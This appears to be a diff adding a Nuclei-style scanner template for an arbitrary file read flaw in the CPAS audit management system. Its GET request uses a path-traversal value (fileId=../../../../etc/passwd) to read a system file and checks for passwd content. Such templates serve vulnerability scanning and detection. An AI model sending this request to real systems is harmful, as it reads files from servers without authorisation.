@@ -1,0 +1,21 @@
+id: CPAS-downPlugs-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: CPAS审计管理系统存在任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/commit/9f20511bb02d7babac30c47f48a72d427b7f5a3b#diff-b96b4a0a93b570a2543f522a44cd08cb3ef4986aebd27f103ca75c78e75e9c33R3
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName="
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
